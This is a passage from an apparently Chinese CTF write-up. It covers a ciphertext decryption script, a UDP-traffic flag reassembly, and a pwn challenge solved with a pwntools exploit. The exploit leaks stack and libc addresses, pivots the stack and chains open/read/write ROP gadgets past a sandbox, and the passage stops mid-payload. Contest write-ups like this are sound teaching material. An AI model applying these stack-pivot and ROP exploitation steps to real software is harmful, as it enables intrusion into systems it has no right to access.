+</span></span><span class=line><span class=cl><span class=n>ciphertext</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;Cia110～(∠・ω&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★ Cial10～(∠・ω&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★ Cial10～(2・ω&lt;)⌒★ Ci@110～(∠・ω&lt;)⌒★ Cia11o～(∠・ω&lt;)⌒★ Ci@110一(∠・ω&lt;)⌒★ Cia11o～(∠・ω&lt;)⌒★ Cial10～(∠・ω&lt;)⌒★ Cia11o～(∠・ω&lt;)⌒★ Ciall0～(∠・ω&lt;)⌒★ Cia11o～(∠°ω&lt;)⌒★ Cial10一(∠・w&lt;)⌒★ Ci@11o～(∠・ω&lt;)⌒★ Cial1o～(∠・ω&lt;)⌒★ Cial10一(∠°ω&lt;)⌒★ Cia1l0一(∠・ω&lt;)⌒★ Cial1o～(2・ω&lt;)⌒★ Cial10～(∠・w&lt;)⌒★ Ciallo一(2・ω&lt;)⌒★ Cial1o～(2・ω&lt;)⌒★ Cial10～(2・ω&lt;)⌒★ Cia110～(∠・ω&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★ Ci@110～(∠・w&lt;)⌒★ Cia110～(2・ω&lt;)⌒★ Ci@11o～(∠・ω&lt;)⌒★ Ciall0一(∠°ω&lt;)⌒★ Cial10～(∠・w&lt;)⌒★ Ciallo一(∠・w&lt;)⌒★ Cial10～(∠・w&lt;)⌒★ Ci@1lo～(∠・w&lt;)⌒★ Cia1lo一(∠・w&lt;)⌒★ Ci@110～(∠°ω&lt;)⌒★ Cia110～(∠°ω&lt;)⌒★ Ci@110一(∠°ω&lt;)⌒★ Ci@110一(∠・ω&lt;)⌒★ Cial1o～(∠・ω&lt;)⌒★ Cial10一(2・ω&lt;)⌒★ Cia11o～(∠・ω&lt;)⌒★ Cia110～(∠・ω&lt;)⌒★ Ci@110～(2・ω&lt;)⌒★ Cia1l0～(2・ω&lt;)⌒★ Cia1lo～(2・ω&lt;)⌒★ Cia110一(2・ω&lt;)⌒★ Ciallo～(∠・ω&lt;)⌒★ Cia1lo一(∠°ω&lt;)⌒★ Ciallo～(∠・ω&lt;)⌒★ Cial10～(2・ω&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★ Cia1l0一(∠°ω&lt;)⌒★ Cia110～(∠・w&lt;)⌒★ Cial10一(∠・w&lt;)⌒★ Cia1l0～(∠・ω&lt;)⌒★ Cia1lo～(∠°ω&lt;)⌒★ Cia110一(2・ω&lt;)⌒★ Ciallo～(∠・ω&lt;)⌒★ Ci@110～(2・ω&lt;)⌒★ Ci@110一(∠・ω&lt;)⌒★ Ci@1lo～(∠・w&lt;)⌒★ Cia1l0一(∠°ω&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 时间: 2025-10-16 02:27:33 (北京时间)</span>
+</span></span><span class=line><span class=cl><span class=c1># Unix 时间戳</span>
+</span></span><span class=line><span class=cl><span class=n>timestamp</span> <span class=o>=</span> <span class=mi>1760552853</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>70</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;开始解密...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>70</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>ciallo_decrypt</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>,</span> <span class=n>timestamp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>70</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;✓ 解密成功!&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>70</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;明文: </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>70</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;✗ 解密失败: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=kn>import</span> <span class=nn>traceback</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>traceback</span><span class=o>.</span><span class=n>print_exc</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1>#flag{9f08699d-1b6c-471e-9ed0-86dbf3ee8074}</span>
+</span></span></code></pre></td></tr></table></div></div><h1 id=低空经济网络安全>低空经济网络安全</h1><h2 id=the-hidden-link>The Hidden Link</h2><p>全是udp的流量，wirkshark简单的手动分析一下在</p><p><img src=https://su-team.cn/img/2025-QWNT/42.png alt=img></p><p>类似这样B后面有明文，且刚好能拼成正常的flag的内容，手动补填一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>...Bk3d<span class=o>}</span>.
+</span></span><span class=line><span class=cl>...Bll3r.
+</span></span><span class=line><span class=cl>...BflagJ
+</span></span><span class=line><span class=cl>...B<span class=o>{</span>dr0.
+</span></span><span class=line><span class=cl>...Bt_c0:
+</span></span><span class=line><span class=cl>...Bntr0.
+</span></span><span class=line><span class=cl>...B_h4c!
+</span></span><span class=line><span class=cl>...Bn3_f 
+</span></span><span class=line><span class=cl>...Bl1gh.
+</span></span></code></pre></td></tr></table></div></div><p>是乱序简单的拼接一下就能得到flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>flag<span class=o>{</span>dr0n3_fl1ght_c0ntr0ll3r_h4ck3d<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><h1 id=pwn>Pwn</h1><h2 id=stack>stack</h2><p><img src=https://su-team.cn/img/2025-QWNT/43.png alt=img></p><p><img src=https://su-team.cn/img/2025-QWNT/44.png alt=img></p><p>sub_401354控制好输入可以泄漏rbp的栈地址。</p><p>sub_4013B9存在大量栈溢出。</p><p>在sub_4013B9中调试发现栈上存在libc地址：</p><p><img src=https://su-team.cn/img/2025-QWNT/45.png alt=img></p><p>我们可以通过合理控制rbp回到sub_401354来泄漏libc地址0x75ae10429d90然后顺便回到main函数0x401413，但是这样下一次printf会出现栈对齐问题，所以我们需要栈迁移一次避免调用main函数，而是直接调用sub_401354的read部分。</p><p>这样通过合理构造rbp完成栈上的栈迁移，通过sub_401354自带的printf将libc打印出来，然后接上一个sub_4013B9的read部分，再绕开沙盒执行orw即可获得flag：</p><p><img src=https://su-team.cn/img/2025-QWNT/46.png alt=img></p><p>exp：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=c1>#from ctypes import *</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>stre</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>:</span> <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=n>a</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ph</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=o>=</span><span class=s2>&#34;addr&#34;</span><span class=p>)</span> <span class=p>:</span> <span class=nb>print</span><span class=p>(</span><span class=n>b</span><span class=o>+</span><span class=s2>&#34;: &#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>a</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>re</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>:</span> <span class=k>return</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pre</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>:</span> <span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>a</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reu</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span> <span class=p>:</span> <span class=k>return</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=n>b</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rel</span><span class=p>()</span> <span class=p>:</span> <span class=k>return</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>se</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sea</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sel</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sela</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>op</span><span class=p>()</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cp</span><span class=p>()</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>raddr64</span><span class=p>()</span> <span class=p>:</span> <span class=k>return</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> 
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>raddr32</span><span class=p>()</span> <span class=p>:</span> <span class=k>return</span> <span class=n>u32</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>raddr_T</span><span class=p>()</span> <span class=p>:</span> <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>re</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>raddr_A</span><span class=p>()</span> <span class=p>:</span> <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>reu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;-&#34;</span><span class=p>,</span><span class=kc>True</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>orw_rop64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>pop_rsi</span><span class=p>,</span><span class=n>pop_rdx</span><span class=p>,</span><span class=n>flag_addr</span><span class=p>,</span><span class=n>open_addr</span><span class=p>,</span><span class=n>read_addr</span><span class=p>,</span><span class=n>write_addr</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>orw</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>open_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>orw</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>orw</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>read_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>orw</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>orw</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>write_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>orw</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getorw</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>Arch</span><span class=p>)</span> <span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>=</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>+=</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=mh>0x30</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>+=</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=mh>0x30</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>=</span><span class=n>asm</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span><span class=n>arch</span><span class=o>=</span><span class=n>Arch</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>sh</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gdbp</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>a</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>a</span><span class=o>!=</span><span class=s1>&#39;&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>a</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>pause</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>pause</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-8362e3425a.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1>#p = process(&#34;./pwn&#34;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#elf = ELF(&#34;./pwn&#34;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#34;./libc.so.6&#34;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#lib = cdll.LoadLibrary(None)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#loadsym = &#34;glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>#code_addr = &#34; ./glibc-2.41.tar.gz --force&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#p = process([&#34;qemu-mipsel-static&#34;,&#34;-g&#34;, &#34;9999&#34;,&#34;-L&#34;,&#34;./&#34;,&#34;./pwn&#34;])</span>
+</span></span><span class=line><span class=cl><span class=c1>#p = process([&#34;qemu-mipsel-static&#34;,&#34;-L&#34;,&#34;./&#34;,&#34;./pwn&#34;])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#context.log_level = &#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>#context.arch = &#39;amd64&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>#context.os = &#39;linux&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>#elf.arch , elf.so</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x10</span>
+</span></span><span class=line><span class=cl><span class=n>sea</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;name?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>reu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;, &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>reu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>raddr64</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>ph</span><span class=p>(</span><span class=n>stack</span><span class=p>,</span> <span class=s2>&#34;stack&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x60</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=o>+</span><span class=mh>0x70</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4013D4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sea</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4013D4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401385</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>se</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x8</span>
+</span></span><span class=line><span class=cl><span class=n>se</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>reu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;, &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>reu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>raddr64</span><span class=p>()</span> <span class=o>-</span> <span class=mh>0x29d90</span>
+</span></span><span class=line><span class=cl><span class=n>ph</span><span class=p>(</span><span class=n>libc_base</span><span class=p>,</span> <span class=s2>&#34;libc_base&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x2a3e5</span>
+</span></span><span class=line><span class=cl><span class=n>pop_rsi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x2be51</span>
+</span></span><span class=line><span class=cl><span class=n>pop_rax_rdx_rbx</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x904a8</span>
+</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x91316</span>
+</span></span><span class=line><span class=cl><span class=n>flag_addr</span> <span class=o>=</span> <span class=n>stack</span> <span class=o>+</span> <span class=mh>0xF0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x60</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFF9C</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span> 
